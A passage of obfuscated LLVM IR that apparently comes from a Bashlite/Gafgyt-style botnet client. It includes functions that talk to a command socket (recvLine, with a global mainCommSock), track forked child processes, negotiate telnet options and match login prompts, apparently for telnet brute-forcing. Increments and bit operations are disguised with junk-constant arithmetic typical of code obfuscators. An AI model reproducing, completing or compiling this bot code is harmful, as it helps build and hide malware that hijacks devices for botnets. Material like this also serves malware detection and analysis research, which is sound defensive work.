  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %93

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %91

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %69, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = add i64 %46, -7912568078559923745
  %48 = sub i64 %47, 1
  %49 = sub i64 %48, -7912568078559923745
  %50 = sub i64 %46, 1
  %51 = getelementptr inbounds i8, i8* %44, i64 %49
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 13
  br i1 %54, label %67, label %55

; <label>:55:                                     ; preds = %43
  %56 = load i8*, i8** %6, align 8
  %57 = load i8*, i8** %6, align 8
  %58 = call i64 @strlen(i8* %57) #10
  %59 = add i64 %58, 6239634709917088692
  %60 = sub i64 %59, 1
  %61 = sub i64 %60, 6239634709917088692
  %62 = sub i64 %58, 1
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 10
  br label %67

; <label>:67:                                     ; preds = %55, %43
  %68 = phi i1 [ true, %43 ], [ %66, %55 ]
  br i1 %68, label %69, label %78

; <label>:69:                                     ; preds = %67
  %70 = load i8*, i8** %6, align 8
  %71 = load i8*, i8** %6, align 8
  %72 = call i64 @strlen(i8* %71) #10
  %73 = sub i64 %72, 251344597563769324
  %74 = sub i64 %73, 1
  %75 = add i64 %74, 251344597563769324
  %76 = sub i64 %72, 1
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  store i8 0, i8* %77, align 1
  br label %43

; <label>:78:                                     ; preds = %67
  %79 = load i8*, i8** %6, align 8
  %80 = call i8* @strchr(i8* %79, i32 46) #10
  %81 = icmp ne i8* %80, null
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %78
  %83 = load i8*, i8** %6, align 8
  %84 = call i8* @strchr(i8* %83, i32 46) #10
  store i8 0, i8* %84, align 1
  br label %85

; <label>:85:                                     ; preds = %82, %78
  %86 = load i8*, i8** %3, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = call i8* @strcpy(i8* %86, i8* %87) #4
  %89 = load i32, i32* %4, align 4
  %90 = call i32 @close(i32 %89)
  store i32 0, i32* %2, align 4
  br label %96

; <label>:91:                                     ; preds = %13
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:93:                                     ; preds = %8
  %94 = load i32, i32* %4, align 4
  %95 = call i32 @close(i32 %94)
  store i32 1, i32* %2, align 4
  br label %96

; <label>:96:                                     ; preds = %93, %85
  %97 = load i32, i32* %2, align 4
  ret i32 %97
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %23, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %25

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %23

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = sub i32 0, %17
  %19 = sub i32 0, 1
  %20 = add i32 %18, %19
  %21 = sub i32 0, %20
  %22 = add nsw i32 %17, 1
  store i32 %21, i32* %1, align 4
  br label %23

; <label>:23:                                     ; preds = %16, %10
  %24 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:25:                                     ; preds = %5
  %26 = load i32, i32* %2, align 4
  %27 = call i32 @close(i32 %26)
  %28 = load i32, i32* %1, align 4
  ret i32 %28
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %29

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, -637940641
  %14 = add i32 %13, 65
  %15 = sub i32 %14, -637940641
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %5, align 4
  br label %6

; <label>:29:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #4, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = add i32 %48, 1339304292
  %50 = add i32 %49, 1
  %51 = sub i32 %50, 1339304292
  %52 = add nsw i32 %48, 1
  %53 = call i32 @select(i32 %51, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %103

; <label>:55:                                     ; preds = %33
  br label %56

; <label>:56:                                     ; preds = %95, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %102

; <label>:59:                                     ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

; <label>:64:                                     ; preds = %59
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %66 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 0
  %67 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %66) #4, !srcloc !2
  %68 = extractvalue { i64, i64* } %67, 0
  %69 = extractvalue { i64, i64* } %67, 1
  %70 = trunc i64 %68 to i32
  store i32 %70, i32* %14, align 4
  %71 = ptrtoint i64* %69 to i64
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %15, align 4
  br label %73

; <label>:73:                                     ; preds = %64
  %74 = load i32, i32* %5, align 4
  %75 = srem i32 %74, 64
  %76 = zext i32 %75 to i64
  %77 = shl i64 1, %76
  %78 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %79 = load i32, i32* %5, align 4
  %80 = sdiv i32 %79, 64
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [16 x i64], [16 x i64]* %78, i64 0, i64 %81
  %83 = load i64, i64* %82, align 8
  %84 = and i64 %83, %77
  %85 = xor i64 %83, %77
  %86 = or i64 %84, %85
  %87 = or i64 %83, %77
  store i64 %86, i64* %82, align 8
  %88 = load i32, i32* %5, align 4
  %89 = sub i32 %88, -1147559889
  %90 = add i32 %89, 1
  %91 = add i32 %90, -1147559889
  %92 = add nsw i32 %88, 1
  %93 = call i32 @select(i32 %91, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %101

; <label>:95:                                     ; preds = %73
  %96 = load i32, i32* %13, align 4
  %97 = add i32 %96, 15717278
  %98 = add i32 %97, 1
  %99 = sub i32 %98, 15717278
  %100 = add nsw i32 %96, 1
  store i32 %99, i32* %13, align 4
  br label %56

; <label>:101:                                    ; preds = %73
  br label %102

; <label>:102:                                    ; preds = %101, %56
  br label %103

; <label>:103:                                    ; preds = %102, %33
  store i32 0, i32* %18, align 4
  %104 = load i8*, i8** %6, align 8
  store i8* %104, i8** %17, align 8
  br label %105

; <label>:105:                                    ; preds = %127, %103
  %106 = load i32, i32* %7, align 4
  %107 = sub i32 0, %106
  %108 = sub i32 0, -1
  %109 = add i32 %107, %108
  %110 = sub i32 0, %109
  %111 = add nsw i32 %106, -1
  store i32 %110, i32* %7, align 4
  %112 = icmp sgt i32 %106, 1
  br i1 %112, label %113, label %134

; <label>:113:                                    ; preds = %105
  %114 = load i32, i32* @mainCommSock, align 4
  %115 = call i64 @recv(i32 %114, i8* %16, i64 1, i32 0)
  %116 = icmp ne i64 %115, 1
  br i1 %116, label %117, label %119

; <label>:117:                                    ; preds = %113
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  store i32 -1, i32* %4, align 4
  br label %139

; <label>:119:                                    ; preds = %113
  %120 = load i8, i8* %16, align 1
  %121 = load i8*, i8** %17, align 8
  %122 = getelementptr inbounds i8, i8* %121, i32 1
  store i8* %122, i8** %17, align 8
  store i8 %120, i8* %121, align 1
  %123 = load i8, i8* %16, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 10
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %119
  br label %134

; <label>:127:                                    ; preds = %119
  %128 = load i32, i32* %18, align 4
  %129 = sub i32 0, %128
  %130 = sub i32 0, 1
  %131 = add i32 %129, %130
  %132 = sub i32 0, %131
  %133 = add nsw i32 %128, 1
  store i32 %132, i32* %18, align 4
  br label %105

; <label>:134:                                    ; preds = %126, %105
  %135 = load i8*, i8** %17, align 8
  store i8 0, i8* %135, align 1
  %136 = load i8*, i8** %17, align 8
  %137 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i32 0, i32 0), i8* %136)
  %138 = load i32, i32* %18, align 4
  store i32 %138, i32* %4, align 4
  br label %139

; <label>:139:                                    ; preds = %134, %117
  %140 = load i32, i32* %4, align 4
  ret i32 %140
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #5

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %112

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %100

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #13
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %98

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #4, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = and i64 %76, %70
  %78 = xor i64 %76, %70
  %79 = or i64 %77, %78
  %80 = or i64 %76, %70
  store i64 %79, i64* %75, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add i32 %81, 1733751299
  %83 = add i32 %82, 1
  %84 = sub i32 %83, 1733751299
  %85 = add nsw i32 %81, 1
  %86 = call i32 @select(i32 %84, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %87 = icmp sgt i32 %86, 0
  br i1 %87, label %88, label %96

; <label>:88:                                     ; preds = %66
  store i32 4, i32* %13, align 4
  %89 = load i32, i32* %6, align 4
  %90 = bitcast i32* %14 to i8*
  %91 = call i32 @getsockopt(i32 %89, i32 1, i32 4, i8* %90, i32* %13) #4
  %92 = load i32, i32* %14, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %88
  store i32 0, i32* %5, align 4
  br label %112

; <label>:95:                                     ; preds = %88
  br label %97

; <label>:96:                                     ; preds = %66
  store i32 0, i32* %5, align 4
  br label %112

; <label>:97:                                     ; preds = %95
  br label %99

; <label>:98:                                     ; preds = %48
  store i32 0, i32* %5, align 4
  br label %112

; <label>:99:                                     ; preds = %97
  br label %100

; <label>:100:                                    ; preds = %99, %40
  %101 = load i32, i32* %6, align 4
  %102 = call i32 (i32, i32, ...) @fcntl(i32 %101, i32 3, i8* null)
  %103 = sext i32 %102 to i64
  store i64 %103, i64* %15, align 8
  %104 = load i64, i64* %15, align 8
  %105 = xor i64 -2049, -1
  %106 = xor i64 %104, %105
  %107 = and i64 %106, %104
  %108 = and i64 %104, -2049
  store i64 %107, i64* %15, align 8
  %109 = load i32, i32* %6, align 4
  %110 = load i64, i64* %15, align 8
  %111 = call i32 (i32, i32, ...) @fcntl(i32 %109, i32 4, i64 %110)
  store i32 1, i32* %5, align 4
  br label %112

; <label>:112:                                    ; preds = %100, %98, %96, %94, %39
  %113 = load i32, i32* %5, align 4
  ret i32 %113
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #4
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %60

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 0, 1
  %13 = sub i64 %11, %12
  %14 = add i64 %11, 1
  store i64 %13, i64* @numpids, align 8
  %15 = load i64, i64* @numpids, align 8
  %16 = add i64 %15, 2953607637177349829
  %17 = add i64 %16, 1
  %18 = sub i64 %17, 2953607637177349829
  %19 = add i64 %15, 1
  %20 = mul i64 %18, 4
  %21 = call noalias i8* @malloc(i64 %20) #4
  %22 = bitcast i8* %21 to i32*
  store i32* %22, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %23

; <label>:23:                                     ; preds = %41, %10
  %24 = load i32, i32* %4, align 4
  %25 = zext i32 %24 to i64
  %26 = load i64, i64* @numpids, align 8
  %27 = sub i64 0, 1
  %28 = add i64 %26, %27
  %29 = sub i64 %26, 1
  %30 = icmp ult i64 %25, %28
  br i1 %30, label %31, label %47

; <label>:31:                                     ; preds = %23
  %32 = load i32*, i32** @pids, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  %36 = load i32, i32* %35, align 4
  %37 = load i32*, i32** %3, align 8
  %38 = load i32, i32* %4, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds i32, i32* %37, i64 %39
  store i32 %36, i32* %40, align 4
  br label %41

; <label>:41:                                     ; preds = %31
  %42 = load i32, i32* %4, align 4
  %43 = add i32 %42, -132095330
  %44 = add i32 %43, 1
  %45 = sub i32 %44, -132095330
  %46 = add i32 %42, 1
  store i32 %45, i32* %4, align 4
  br label %23

; <label>:47:                                     ; preds = %23
  %48 = load i32, i32* %2, align 4
  %49 = load i32*, i32** %3, align 8
  %50 = load i64, i64* @numpids, align 8
  %51 = add i64 %50, -8619213678299478571
  %52 = sub i64 %51, 1
  %53 = sub i64 %52, -8619213678299478571
  %54 = sub i64 %50, 1
  %55 = getelementptr inbounds i32, i32* %49, i64 %53
  store i32 %48, i32* %55, align 4
  %56 = load i32*, i32** @pids, align 8
  %57 = bitcast i32* %56 to i8*
  call void @free(i8* %57) #4
  %58 = load i32*, i32** %3, align 8
  store i32* %58, i32** @pids, align 8
  %59 = load i32, i32* %2, align 4
  store i32 %59, i32* %1, align 4
  br label %60

; <label>:60:                                     ; preds = %47, %8
  %61 = load i32, i32* %1, align 4
  ret i32 %61
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %112, %1
